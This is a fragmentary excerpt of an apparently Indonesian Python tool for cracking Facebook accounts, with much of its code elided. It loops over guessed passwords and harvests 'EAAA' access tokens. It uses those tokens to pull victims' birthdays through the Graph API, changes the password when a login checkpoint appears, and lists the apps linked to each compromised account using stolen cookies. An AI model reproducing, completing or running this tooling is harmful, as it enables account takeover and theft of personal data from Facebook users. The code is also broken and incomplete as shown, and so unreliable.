...
def cek_opsi(user,pw):
	...
	ua_c = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
	ua_z = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
	session=req.Session()
			...
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				...
				if "y" in ubahP:
					...
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						...
						cek_aapk = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
						cek_app = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
						if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek_aapk)):
							...
							hit1,hit2 = 0,0
							textg +=(f"{jarak}{war}Apk Aktif\n")
							apkAktif = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek_aapk))
							ditambahkan = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek_aapk))
...
def cek_apk(session,coki):
	...
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
		print(f"{jarak}{war}Apk yang terkait:")
		if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
			...
			for muncul in apkAktif:
				hit1+=1
				print(f"{jarak}{jarak}[{C}{hit1}{Q}] {H}{muncul}{Q} ==> {U}{ditambahkan[hit2]}{Q}")
				hit2+=1
		if "Anda tidak memiliki aplikasi atau situs web kadaluarsa untuk ditinjau." in cek2:
			...
			hit1,hit2=0,0
			print(f"{jarak}Apk kadaluarsa :")
			apkKadaluarsa = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek2))
			kadaluarsa = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek2))
			for muncul in apkKadaluarsa:
				hit1+=1
				print(f"{jarak}{jarak}[{C}{hit1}{Q}] {K}{muncul}{Q} ==> {U}{kadaluarsa[hit2]}{Q}")
				hit2+=1
	else:
		print(war+"Terjadi Masalah DiCookies !!")
	print("")
def cek_apk_(session,coki):
	cek_aapk = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	cek_app = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek_aapk)):
		if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek_aapk:
			print(f"{jarak}{war}Apk Aktif •")
			print(f"{jarak}{jarak}{war} Tidak Ada Yang Terkait")
		else:
			hit1,hit2 = 0,0
...
def cek_konek():
	try:
		cek_jaringan = requests.get("https://github.com/Dumai-991/Dumai-991")
		pass
	except requests.exceptions.ConnectionError:
        ...
        for pw in zkth:
            ...
            if 'access_token' in response.text and 'EAAA' in response.text:
                ...
                try:
                    ...
                    ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(user, token)).json()["birthday"]
                    month, day, year = ttl.split("/")
                    month = bulan_ttl[month]
